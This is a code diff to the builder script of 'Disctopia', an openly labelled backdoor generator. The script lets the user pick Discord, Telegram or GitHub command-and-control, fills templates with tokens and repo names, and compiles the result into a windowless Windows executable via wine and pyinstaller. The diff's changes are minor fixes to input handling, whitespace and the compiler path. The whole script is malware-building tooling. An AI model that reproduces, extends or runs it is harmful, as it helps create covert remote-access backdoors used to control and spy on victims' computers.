@@ -18,16 +18,16 @@ def clear_screen():
 clear_screen()
 
 print('''
-▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄      
-▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██▒▒████▄    
-░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒██▒▒██  ▀█▄  
-░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░██░░██▄▄▄▄██ 
+▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄
+▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██▒▒████▄
+░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒██▒▒██  ▀█▄
+░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░██░░██▄▄▄▄██
 ░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░▒██▒ ░  ░░██░ ▓█   ▓██▒
  ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░░▓   ▒▒   ▓▒█░
  ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒       ░      ░ ▒ ▒░ ░▒ ░      ▒ ░  ▒   ▒▒ ░
- ░ ░  ░  ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░░        ▒ ░  ░   ▒   
+ ░ ░  ░  ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░░        ▒ ░  ░   ▒
    ░     ░        ░  ░ ░                   ░ ░            ░        ░  ░ v2.1.2
- ░                   ░                                                 
+ ░                   ░
 
 Made by Dimitris Kalopisis aka Ectos | Twitter: @DKalopisis \n\nRun 'help use' to get started!''')
 
@@ -56,8 +56,12 @@ def createTable(list):
 payload = ""
 try:
     while True:
-        
-        command = input(f"[+] {payload} > ")
+        try:
+            command = input(f"[+] {payload} > ")
+        except EOFError:
+            print("\n[+] Exiting!")
+            exit()
+
         command_list = command.split()
 
         if command_list == []:
@@ -74,19 +78,19 @@ try:
                 if command_list[1] == "discord":
                     print("[+] Using Discord C2")
                     payload = "discord"
-                    table = createTable(list)    
+                    table = createTable(list)
                     print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                     print("Run 'help set' for more information\n")
                 elif command_list[1] == "telegram":
                     print("[+] Using Telegram C2")
                     payload = "telegram"
-                    table = createTable(list)    
+                    table = createTable(list)
                     print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                     print("Run 'help set' for more information\n")
                 elif command_list[1] == "github":
                     print("[+] Using Github C2")
                     payload = "github"
-                    table = createTable(list)    
+                    table = createTable(list)
                     print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                     print("Run 'help set' for more information\n")
                 else:
@@ -138,7 +142,7 @@ try:
                 print('''\n
         Help Menu:
 
-        "help <command>" Displays more help for a specific command 
+        "help <command>" Displays more help for a specific command
 
         "use <payload>" Selects a payload to use
 
@@ -217,8 +221,12 @@ try:
 
         elif command_list[0] == "build":
             print("[?] Are you sure you want to build the backdoor? (y/n)")
-            input = input()
-            if input == "y":
+            try:
+                user_input = input()
+            except EOFError:
+                user_input = "n"
+
+            if user_input == "y":
                 print("[+] Building backdoor...")
                 if payload == "discord":
                     f = open("code/discord/main.py", 'r')
@@ -242,20 +250,13 @@ try:
                     f.close()
                     newfile = file.replace("{TOKEN}", str(list[1]))
                     newfile = newfile.replace("{REPO}", str(list[2]))
-                
+
 
                 f = open(list[0]+".py", 'w')
                 f.write(newfile)
                 f.close()
 
-                if os.path.exists('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe'):
-                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
-                else:
-                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
-                
-                if "Arch" in distro.name() or "Manjaro" in distro.name():
-                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
-                compile_command = ["wine", path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", list[0]+".py"]
+                compile_command = ["wine", "pyinstaller", "--onefile", "--noconsole", "--icon=img/exe_file.ico", list[0]+".py"]
 
                 subprocess.call(compile_command)
                 try:
